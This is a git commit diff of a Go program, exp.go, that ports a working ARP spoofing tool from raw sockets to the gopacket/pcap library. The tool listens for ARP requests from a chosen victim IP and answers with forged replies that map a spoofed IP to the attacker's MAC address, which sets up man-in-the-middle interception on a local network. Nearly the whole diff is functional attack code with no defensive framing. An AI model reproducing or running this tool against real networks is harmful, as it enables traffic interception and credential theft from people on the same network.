2ad34b4c550ce0263d0a8ed18a997fef9657cc35
limit1 <1217917582@qq.com>
2026-05-22 12:15:12 +0800

    gopacket

--- exp.go
+++ exp.go
@@ -1,43 +1,34 @@
 package main
 
 import (
-	"encoding/binary"
 	"errors"
 	"fmt"
 	"net"
 	"os"
-	"syscall"
+
+	"github.com/google/gopacket"
+	"github.com/google/gopacket/layers"
+	"github.com/google/gopacket/pcap"
 )
 
 const (
-	ethPIP     = 0x0800
-	ethPARP    = 0x0806
-	arpRequest = 1
-	arpReply   = 2
-
 	macAddrLen = 6
 	ipAddrLen  = 4
-	ethHdrLen  = 14
-	arpHdrLen  = 28
-	frameLen   = ethHdrLen + arpHdrLen
+	snapLen    = 1600
 )
 
-func htons(v uint16) uint16 {
-	return (v<<8)&0xff00 | v>>8
-}
-
-func getLocalMACIP(ifname string) (net.HardwareAddr, net.IP, int, error) {
+func getLocalMACIP(ifname string) (net.HardwareAddr, net.IP, error) {
 	iface, err := net.InterfaceByName(ifname)
 	if err != nil {
-		return nil, nil, 0, err
+		return nil, nil, err
 	}
 	if len(iface.HardwareAddr) != macAddrLen {
-		return nil, nil, 0, fmt.Errorf("invalid MAC address for %s", ifname)
+		return nil, nil, fmt.Errorf("invalid MAC address for %s", ifname)
 	}
 
 	addrs, err := iface.Addrs()
 	if err != nil {
-		return nil, nil, 0, err
+		return nil, nil, err
 	}
 	for _, addr := range addrs {
 		var ip net.IP
@@ -48,11 +39,11 @@ func getLocalMACIP(ifname string) (net.HardwareAddr, net.IP, int, error) {
 			ip = v.IP
 		}
 		if ip4 := ip.To4(); ip4 != nil {
-			return iface.HardwareAddr, ip4, iface.Index, nil
+			return iface.HardwareAddr, ip4, nil
 		}
 	}
 
-	return nil, nil, 0, fmt.Errorf("no IPv4 address found for %s", ifname)
+	return nil, nil, fmt.Errorf("no IPv4 address found for %s", ifname)
 }
 
 func parseIPv4(s string) (net.IP, error) {
@@ -63,26 +54,29 @@ func parseIPv4(s string) (net.IP, error) {
 	return ip, nil
 }
 
-func sendARPReply(fd int, senderMAC net.HardwareAddr, senderIP net.IP, targetMAC net.HardwareAddr, targetIP net.IP, destMAC net.HardwareAddr) error {
-	packet := make([]byte, frameLen)
+func sendARPReply(handle *pcap.Handle, senderMAC net.HardwareAddr, senderIP net.IP, targetMAC net.HardwareAddr, targetIP net.IP) error {
+	eth := &layers.Ethernet{
+		SrcMAC:       senderMAC,
+		DstMAC:       targetMAC,
+		EthernetType: layers.EthernetTypeARP,
+	}
+	arp := &layers.ARP{
+		AddrType:          layers.LinkTypeEthernet,
+		Protocol:          layers.EthernetTypeIPv4,
+		HwAddressSize:     macAddrLen,
+		ProtAddressSize:   ipAddrLen,
+		Operation:         layers.ARPReply,
+		SourceHwAddress:   []byte(senderMAC),
+		SourceProtAddress: []byte(senderIP.To4()),
+		DstHwAddress:      []byte(targetMAC),
+		DstProtAddress:    []byte(targetIP.To4()),
+	}
 
-	copy(packet[0:6], destMAC)
-	copy(packet[6:12], senderMAC)
-	binary.BigEndian.PutUint16(packet[12:14], ethPARP)
-
-	arp := packet[ethHdrLen:]
-	binary.BigEndian.PutUint16(arp[0:2], 1)
-	binary.BigEndian.PutUint16(arp[2:4], ethPIP)
-	arp[4] = macAddrLen
-	arp[5] = ipAddrLen
-	binary.BigEndian.PutUint16(arp[6:8], arpReply)
-	copy(arp[8:14], senderMAC)
-	copy(arp[14:18], senderIP.To4())
-	copy(arp[18:24], targetMAC)
-	copy(arp[24:28], targetIP.To4())
-
-	_, err := syscall.Write(fd, packet)
-	if err != nil {
+	buf := gopacket.NewSerializeBuffer()
+	if err := gopacket.SerializeLayers(buf, gopacket.SerializeOptions{FixLengths: true}, eth, arp); err != nil {
+		return err
+	}
+	if err := handle.WritePacketData(buf.Bytes()); err != nil {
 		return err
 	}
 
@@ -91,7 +85,7 @@ func sendARPReply(fd int, senderMAC net.HardwareAddr, senderIP net.IP, targetMAC
 }
 
 func run(ifname, victimIPStr, spoofedIPStr string) error {
-	myMAC, myIP, ifindex, err := getLocalMACIP(ifname)
+	myMAC, myIP, err := getLocalMACIP(ifname)
 	if err != nil {
 		return fmt.Errorf("failed to get local MAC/IP for %s: %w", ifname, err)
 	}
@@ -109,52 +103,47 @@ func run(ifname, victimIPStr, spoofedIPStr string) error {
 	fmt.Printf("[*] Local IP : %s\n", myIP)
 	fmt.Printf("[*] Spoofing: %s claims to be %s\n", victimIPStr, spoofedIPStr)
 
-	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(htons(ethPARP)))
+	handle, err := pcap.OpenLive(ifname, snapLen, false, pcap.BlockForever)
 	if err != nil {
-		return fmt.Errorf("socket(AF_PACKET): %w\nHint: run as root or with CAP_NET_RAW", err)
+		return fmt.Errorf("pcap open %s: %w\nHint: run as root or with CAP_NET_RAW/CAP_NET_ADMIN", ifname, err)
 	}
-	defer syscall.Close(fd)
+	defer handle.Close()
 
-	sll := &syscall.SockaddrLinklayer{
-		Protocol: htons(ethPARP),
-		Ifindex:  ifindex,
-	}
-	if err := syscall.Bind(fd, sll); err != nil {
-		return fmt.Errorf("bind: %w", err)
+	if err := handle.SetBPFFilter("arp"); err != nil {
+		return fmt.Errorf("set BPF filter: %w", err)
 	}
 
 	fmt.Printf("[*] Listening for ARP requests on %s...\n", ifname)
 
-	buffer := make([]byte, 1514)
+	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
 	for {
-		n, _, err := syscall.Recvfrom(fd, buffer, 0)
+		packet, err := packetSource.NextPacket()
 		if err != nil {
-			return fmt.Errorf("recv: %w", err)
+			return fmt.Errorf("read packet: %w", err)
 		}
-		if n < frameLen {
-			continue
-		}
-		if binary.BigEndian.Uint16(buffer[12:14]) != ethPARP {
+
+		arpLayer := packet.Layer(layers.LayerTypeARP)
+		if arpLayer == nil {
 			continue
 		}
 
-		arp := buffer[ethHdrLen:]
-		if binary.BigEndian.Uint16(arp[6:8]) != arpRequest {
+		arp, ok := arpLayer.(*layers.ARP)
+		if !ok || arp.Operation != layers.ARPRequest {
 			continue
 		}
-		if !net.IP(arp[24:28]).Equal(spoofedIP) {
+		if !net.IP(arp.DstProtAddress).Equal(spoofedIP) {
 			continue
 		}
-		if !net.IP(arp[14:18]).Equal(victimIP) {
+		if !net.IP(arp.SourceProtAddress).Equal(victimIP) {
 			continue
 		}
 
-		senderMAC := net.HardwareAddr(append([]byte(nil), arp[8:14]...))
-		senderIP := net.IP(append([]byte(nil), arp[14:18]...))
+		senderMAC := net.HardwareAddr(append([]byte(nil), arp.SourceHwAddress...))
+		senderIP := net.IP(append([]byte(nil), arp.SourceProtAddress...))
 
 		fmt.Printf("[>] Caught ARP request for %s from %s / %s\n", spoofedIP, senderIP, senderMAC)
 
-		if err := sendARPReply(fd, myMAC, spoofedIP, senderMAC, senderIP, senderMAC); err != nil {
+		if err := sendARPReply(handle, myMAC, spoofedIP, senderMAC, senderIP); err != nil {
 			fmt.Fprintf(os.Stderr, "send ARP reply: %v\n", err)
 		}
 	}
